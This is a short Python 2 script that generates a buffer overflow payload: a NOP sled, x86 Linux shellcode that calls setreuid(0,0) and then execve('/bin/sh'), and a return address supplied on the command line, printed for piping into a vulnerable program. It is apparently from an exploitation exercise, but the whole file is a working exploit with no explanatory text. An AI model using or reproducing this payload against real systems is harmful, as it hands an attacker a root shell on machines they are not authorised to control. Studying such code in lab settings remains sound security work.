import struct, sys

def main():
    address = int(sys.argv[1], 16)
    shellcode = "\x31\xc0\xb0\x46\x31\xc9\x31\xdb\xcd\x80\xeb\x18\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x31\xc0\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
    return_address = struct.pack("I", address)
    padding = "\x90" * (400-len(shellcode))
    payload = padding[:-10] + shellcode + padding[-10:] + return_address*2

    print payload

if __name__ == "__main__":
    main()
